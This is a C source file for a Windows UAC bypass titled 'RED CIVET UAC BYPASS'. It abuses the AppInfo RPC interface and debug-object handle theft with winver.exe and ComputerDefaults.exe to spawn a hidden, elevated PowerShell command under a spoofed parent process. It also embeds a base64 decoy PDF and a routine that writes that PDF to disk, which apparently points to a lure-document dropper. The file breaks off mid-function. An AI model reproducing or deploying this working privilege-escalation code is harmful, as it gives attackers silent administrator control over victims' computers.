#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <rpcndr.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <wincrypt.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")


// --- Constants & Typedefs ---
#define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
#define T_DEFAULT_DESKTOP L"WinSta0\\Default"
#define WINVER_EXE L"\\winver.exe"
#define COMPUTERDEFAULTS_EXE L"\\ComputerDefaults.exe"
#define ProcessDebugObjectHandle 30
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
const char* pdf_base64 = "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Pj4KZW5kb2JqCjEgMCBvYmoKPDwgL1R5cGUgL09DRyAvTmFtZSAoTUFUQ0FUKQo+PgplbmRvYmoKMiAwIG9iago8PCAvVHlwZSAvT0NHIC9OYW1lIChMaWVuX0RhbSkKPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL09DRyAvTmFtZSAoQU1fNykKPj4KZW5kb2JqCjkgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCA4IDAgUiAvTWVkaWFCb3ggWzAgMCA1OTUgODQyXSAvQ29udGVudHMgWzYgMCBSCl0gL0Fubm90cyBbNCAwIFIgNSAwIFIgXSAvUm90YXRlIDI3MCAKIC9WUCBbCjw8ICAvTWVhc3VyZQo8PCAgL1N1YnR5cGUgL1JMCiAvQSBbCjw8ICAvQyAxIC9VICggKQo+Pl0KIC9EIFsKPDwgIC9DIDEgL1UgKCApCj4+XQogL1ggWwo8PCAgL0MgMC4xNTUwNCAvVSAoICkKPj5dCiAvUiAoICkgL1R5cGUgL01lYXN1cmUKPj4gL1R5cGUgL1ZpZXdwb3J0IC9CQm94IFs0OCAwIDU0NiA4NDFdCj4+XSAvUmVzb3VyY2VzCjw8ICAvUHJvY1NldCBbIC9QREZdCiAvRXh0R1N0YXRlCjw8ICAvR1QyNTUgNyAwIFIKPj4KIC9Qcm9wZXJ0aWVzCjw8ICAvb2MxIDEgMCBSIC9vYzIgMiAwIFIgL29jMyAzIDAgUgo+Pgo+Pgo+PgplbmRvYmoKOCAwIG9iago8PCAvVHlwZSAvUGFnZXMgL0tpZHMgWzkgMCBSCl0gL0NvdW50IDEKPj4KZW5kb2JqCjQgMCBvYmoKCjw8ICAvU3VidHlwZSAvU3F1YXJlIC9SZWN0IFs0NDUgNDcgNDIwIDEzM10gL1QgKEF1dG9DQUQgU0hYIFRleHQpIC9GIDY0IC9Db250ZW50cyA8ZmVmZjAwMzEwMDM3MDAyMDAwNzIwMGUzMDA2ZTAwNjg+IC9Cb3JkZXIgWzAgMCAwXQo+PgplbmRvYmoKNSAwIG9iagoKPDwgIC9TdWJ0eXBlIC9TcXVhcmUgL1JlY3QgWzQzMSA0NzIgNDAwIDU0OV0gL1QgKEF1dG9DQUQgU0hYIFRleHQpIC9GIDY0IC9Db250ZW50cyA8ZmVmZjAwMzEwMDM2MDAyMDAwNjcwMGUyMDA2ZT4gL0JvcmRlciBbMCAwIDBdCj4+CmVuZG9iagoxMCAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgOCAwIFIgL09DUHJvcGVydGllcwo8PCAgL09DR3MgWyAxIDAgUiAyIDAgUiAzIDAgUl0gIC9ECjw8ICAvT3JkZXIgWyAzIDAgUiAyIDAgUiAxIDAgUl0gL09GRiBbXQo+Pgo+PiAvUGFnZU1vZGUgL1VzZU9DIC9QYWdlTGF5b3V0IC9TaW5nbGVQYWdlIC9QYWdlTGFiZWxzCjw8ICAvTnVtcyBbMAo8PCAgL1AgPGZlZmYwMDViMDAzMTAwNWQwMDIwMDA0ZDAwNmYwMDY0MDA2NTAwNmM+Cj4+XQo+PiAvUGFnZU1vZGUgL1VzZU91dGxpbmVzIC9PdXRsaW5lcyAxMSAwIFIKPj4KZW5kb2JqCjEzIDAgb2JqCjw8ICAvVGl0bGUgPGZlZmYwMDRkMDA2ZjAwNjQwMDY1MDA2Yz4gIC9QYXJlbnQgMTIgMCBSIC9EZXN0IFs5IDAgUiAgL0ZpdF0KPj4KZW5kb2JqCjEyIDAgb2JqCjw8ICAvVGl0bGUgPGZlZmYwMDUzMDA2ODAwNjUwMDY1MDA3NDAwNzMwMDIwMDA2MTAwNmUwMDY0MDAyMDAwNTYwMDY5MDA2NTAwNzcwMDczPiAgL1BhcmVudCAxMSAwIFIgL0NvdW50IDEgL0ZpcnN0IDEzIDAgUiAvTGFzdCAxMyAwIFIKPj4KZW5kb2JqCjExIDAgb2JqCjw8IC9UeXBlIC9PdXRsaW5lcyAvQ291bnQgMSAvRmlyc3QgMTIgMCBSIC9MYXN0IDEyIDAgUgo+PgplbmRvYmoKMTQgMCBvYmoKPDwgIC9DcmVhdG9yIChBdXRvQ0FEIE1lY2hhbmljYWwgMjAyMiAtIEVuZ2xpc2ggMjAyMiBcKDI0LjFzIFwoTE1TIFRlY2hcKVwpKSAvVGl0bGUgKE1vZGVsKSAvUHJvZHVjZXIgKHBkZnBsb3QxNi5oZGkgMTYuMDEuMDUxLjAwMDAwKSAvQ3JlYXRpb25EYXRlIChEOjIwMjQwOTE2MDczNjU0KSAvTW9kRGF0ZSAoRDoyMDI0MDkxNjA3MzY1NCkKPj4KZW5kb2JqCnhyZWYKMCAxNQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDM2MTAgMDAwMDAgbiAKMDAwMDAwMzY1NyAwMDAwMCBuIAowMDAwMDAzNzA2IDAwMDAwIG4gCjAwMDAwMDQyNDMgMDAwMDAgbiAKMDAwMDAwNDM5NSAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDM1MzYgMDAwMDAgbiAKMDAwMDAwNDE4NSAwMDAwMCBuIAowMDAwMDAzNzUxIDAwMDAwIG4gCjAwMDAwMDQ1NDQgMDAwMDAgbiAKMDAwMDAwNTA5OCAwMDAwMCBuIAowMDAwMDA0OTQ1IDAwMDAwIG4gCjAwMDAwMDQ4NTIgMDAwMDAgbiAKMDAwMDAwNTE3MiAwMDAwMCBuIAp0cmFpbGVyCjw8ICAvU2l6ZSAxNSAvUm9vdCAxMCAwIFIgL0luZm8gMTQgMCBSCj4+CnN0YXJ0eHJlZgo1Mzg2CiUlRU9GDQ=="
typedef LONG NTSTATUS;
typedef struct _UC_CONTEXT {
    WCHAR szSystemDirectory[MAX_PATH + 1];
    WCHAR szSystemRoot[MAX_PATH + 1];
} UC_CONTEXT, *PUC_CONTEXT;

UC_CONTEXT g_ctx_struct;
PUC_CONTEXT g_ctx = &g_ctx_struct;

// --- Native Prototypes ---
extern NTSTATUS NTAPI NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
extern NTSTATUS NTAPI NtRemoveProcessDebug(HANDLE, HANDLE);
extern NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
extern VOID NTAPI DbgUiSetThreadDebugObject(HANDLE);
extern NTSTATUS NTAPI NtClose(HANDLE);

// --- AppInfo RPC Structures (Omitted for brevity, use same as previous) ---
typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
typedef struct _APP_STARTUP_INFO {
    wchar_t* lpszTitle; long dwX; long dwY; long dwXSize; long dwYSize;
    long dwXCountChars; long dwYCountChars; long dwFillAttribute; long dwFlags;
    short wShowWindow; short cbReserved2; struct _MONITOR_POINT MonitorPoint;
} APP_STARTUP_INFO;

typedef struct _APP_PROCESS_INFORMATION {
    unsigned __int3264 ProcessHandle; unsigned __int3264 ThreadHandle;
    long ProcessId; long ThreadId;
} APP_PROCESS_INFORMATION;

// RPC Infrastructure
typedef struct { short Pad; unsigned char Format[75]; } appinfo_MIDL_TYPE_FORMAT_STRING;
typedef struct { short Pad; unsigned char Format[103]; } appinfo_MIDL_PROC_FORMAT_STRING;
static const appinfo_MIDL_TYPE_FORMAT_STRING appinfo__MIDL_TypeFormatString = { 0, { 0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x0a, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x14, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x4c, 0x00, 0xe3, 0xff, 0x40, 0x5c, 0x5b, 0x12, 0x08, 0x05, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0xb9, 0x08, 0x08, 0x5c, 0x5b, 0x11, 0x0c, 0x08, 0x5c, 0x00 } };
static const appinfo_MIDL_PROC_FORMAT_STRING appinfo__MIDL_ProcFormatString = { 0, { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x32, 0x00, 0x08, 0x00, 0x20, 0x00, 0x24, 0x00, 0xc7, 0x0c, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x02, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x02, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x30, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x38, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x40, 0x00, 0x16, 0x00, 0x48, 0x00, 0x48, 0x00, 0xb9, 0x00, 0x48, 0x00, 0x50, 0x00, 0x08, 0x00, 0x13, 0x61, 0x58, 0x00, 0x38, 0x00, 0x50, 0x21, 0x60, 0x00, 0x08, 0x00, 0x70, 0x00, 0x68, 0x00, 0x08, 0x00, 0x00 } };
static const RPC_CLIENT_INTERFACE LaunchAdminProcess___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0x201ef99a,0x7fa0,0x444c,{0x93,0x99,0x19,0xba,0x84,0xf1,0x2a,0x1a}},{1,0}}, {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}}, 0, 0, 0, 0, 0, 0x00000000 };
static RPC_BINDING_HANDLE LaunchAdminProcess__MIDL_AutoBindHandle;
static const MIDL_STUB_DESC LaunchAdminProcess_StubDesc = { (void *)&LaunchAdminProcess___RpcClientInterface, NdrOleAllocate, NdrOleFree, &LaunchAdminProcess__MIDL_AutoBindHandle, 0, 0, 0, 0, appinfo__MIDL_TypeFormatString.Format, 1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0 };

void RAiLaunchAdminProcess(PRPC_ASYNC_STATE AsyncHandle, handle_t hBinding, wchar_t *Path, wchar_t *Cmd, long SFlags, long CFlags, wchar_t *Dir, wchar_t *WSta, struct _APP_STARTUP_INFO *SInfo, unsigned __int3264 hWnd, long Tout, struct _APP_PROCESS_INFORMATION *PInfo, long *Elev) {
    NdrAsyncClientCall((PMIDL_STUB_DESC)&LaunchAdminProcess_StubDesc, (PFORMAT_STRING)&appinfo__MIDL_ProcFormatString.Format[0], AsyncHandle, hBinding, Path, Cmd, SFlags, CFlags, Dir, WSta, SInfo, hWnd, Tout, PInfo, Elev);
}

BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show, APP_PROCESS_INFORMATION *PInfo) {
    RPC_BINDING_HANDLE hBinding = NULL; RPC_ASYNC_STATE asyncState; RPC_STATUS status; RPC_SECURITY_QOS_V3 sqos; RPC_WSTR StringBinding = NULL; PSID LocalSystemSid = NULL; DWORD cbSid = SECURITY_MAX_SID_SIZE; APP_STARTUP_INFO appStartup = { 0 }; LONG elevationType = 0; VOID* Reply = NULL;
    status = RpcStringBindingComposeW((RPC_WSTR)APPINFO_RPC, L"ncalrpc", NULL, NULL, NULL, &StringBinding);
    status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
    RpcStringFreeW(&StringBinding);
    LocalSystemSid = (PSID)LocalAlloc(LPTR, cbSid);
    if (LocalSystemSid && CreateWellKnownSid(WinLocalSystemSid, NULL, LocalSystemSid, &cbSid)) {
        sqos.Version = 3; sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE; sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH; sqos.Sid = LocalSystemSid;
        status = RpcBindingSetAuthInfoExW(hBinding, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&sqos);
    }
    appStartup.dwFlags = STARTF_USESHOWWINDOW; appStartup.wShowWindow = Show;
    RpcAsyncInitializeHandle(&asyncState, sizeof(RPC_ASYNC_STATE)); asyncState.NotificationType = RpcNotificationTypeEvent; asyncState.u.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    RAiLaunchAdminProcess(&asyncState, hBinding, Path, Cmd, SFlags, CFlags, Dir, WSta, &appStartup, (unsigned __int3264)hWnd, Tout, PInfo, &elevationType);
    WaitForSingleObject(asyncState.u.hEvent, INFINITE);
    BOOL result = (RpcAsyncCompleteCall(&asyncState, &Reply) == RPC_S_OK);
    CloseHandle(asyncState.u.hEvent); RpcBindingFree(&hBinding);
    return result;
}

NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
    NTSTATUS status = (NTSTATUS)0xC0000001;
    SIZE_T size = 0;
    STARTUPINFOEXW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    // --- CRITICAL FIX 1: REMOVE PathFileExistsW ---
    // We cannot check if the "command line" exists as a file.
    
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    
    if (!si.lpAttributeList) return status;

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
        return status;
    }

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return status;
    }

    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE; // Keep it stealthy
    si.StartupInfo.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    // --- CRITICAL FIX 2: CreateProcessW Usage ---
    // Parameter 1: NULL (Let Windows parse the command line)
    // Parameter 2: Payload (The full command string)
    // Parameter 6: Must include CREATE_NO_WINDOW to fix Error 123/Visibility
    
    if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE, 
        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, 
        NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
        
        printf("[SUCCESS] ucmx: Child PID %d created.\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        status = 0; // STATUS_SUCCESS
    } else {
        printf("[ERROR] ucmx: CreateProcessW failed. Error: %lu\n", GetLastError());
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    return status;
}

int main() {
    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
    APP_PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    
    WCHAR szSystemDir[MAX_PATH];
    WCHAR szWindowsDir[MAX_PATH];
    WCHAR szProcess[MAX_PATH * 2];
    WCHAR targetPath[MAX_PATH] = { 0 };
    WCHAR weaponizedCmd[2048] = { 0 };

    // 1. GET ARGS
    int nArgs;
    LPWSTR* szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);

    printf("--- RED CIVET UAC BYPASS: DEBUG VERSION ---\n");

    // 3. INIT DIRECTORIES (Local stack instead of g_ctx)
    GetSystemDirectoryW(szSystemDir, MAX_PATH);
    GetWindowsDirectoryW(szWindowsDir, MAX_PATH);

    // 4. BUILD COMMAND
    swprintf_s(weaponizedCmd, 2048, 
        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$w=New-Object -ComObject WScript.Shell;Start-Process notepad;Start-Sleep -Milliseconds 500;$w.SendKeys('hack')\"");

    printf("[DEBUG] Target: %ws\n", targetPath);
    printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);

    // 5. PHASE 1: WINVER
    printf("[PHASE 1] Starting Winver RPC...\n");
    wcscpy_s(szProcess, MAX_PATH * 2, szSystemDir);
    wcscat_s(szProcess, MAX_PATH * 2, L"\\winver.exe");

    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    
    // Using szWindowsDir (SystemRoot) directly here
    if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, szWindowsDir, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
        printf("[FAIL] Stage 1 failed. Error: %lu\n", GetLastError());
        return 1;
    }

    NtQueryInformationProcess((HANDLE)procInfo.ProcessHandle, 30, &dbgHandle, sizeof(HANDLE), NULL);
    if (!dbgHandle) { printf("[FAIL] No DbgHandle\n"); return 1; }

    NtRemoveProcessDebug((HANDLE)procInfo.ProcessHandle, dbgHandle);
    TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
    CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);

    // 6. PHASE 2: COMPUTERDEFAULTS
    printf("[PHASE 2] Starting ComputerDefaults...\n");
    wcscpy_s(szProcess, MAX_PATH * 2, szSystemDir);
    wcscat_s(szProcess, MAX_PATH * 2, L"\\ComputerDefaults.exe");
    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));

    if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, szWindowsDir, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
        printf("[FAIL] Stage 2 failed.\n"); return 1;
    }

    DbgUiSetThreadDebugObject(dbgHandle);

    while (1) {
        if (!WaitForDebugEvent(&dbgEvent, 5000)) { // 5 second timeout
            printf("[FAIL] Timeout waiting for debug event.\n");
            break;
        }

        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
            dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
        }

        if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && dbgProcessHandle) {
            printf("[PHASE 2] DLL Loaded. Spoofing Parent...\n");
            if (NtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0) == 0) {
                // THE CRITICAL CALL
                ucmxCreateProcessFromParent(dupHandle, weaponizedCmd);
                printf("[SUCCESS] Payload launched via Parent 0x%p\n", dupHandle);
                NtClose(dupHandle);
            }
            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
            break; 
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }

    // 7. CLEANUP
    DebugActiveProcessStop(procInfo.ProcessId);
    DbgUiSetThreadDebugObject(NULL);
    NtClose(dbgHandle);
    TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
    
    if (szArglist) LocalFree(szArglist);
    printf("--- DONE ---\n");
    return 0;
}


BOOL SaveBase64ToPdf(const char* b64, const wchar_t* outPath)
{
    DWORD needed = 0;

    if (!CryptStringToBinaryA(
        b64,
        0,
        CRYPT_STRING_BASE64,
        NULL,
        &needed,
        NULL,
        NULL))
    {
        return FALSE;
    }

    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, needed);
    if (!buffer)
        return FALSE;

    if (!CryptStringToBinaryA(
        b64,
        0,
        CRYPT_STRING_BASE64,
        buffer,
        &needed,
        NULL,
        NULL))
    {
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    HANDLE hFile = CreateFileW(
        outPath,
        GENERIC_WRITE,
        0,
        NULL,
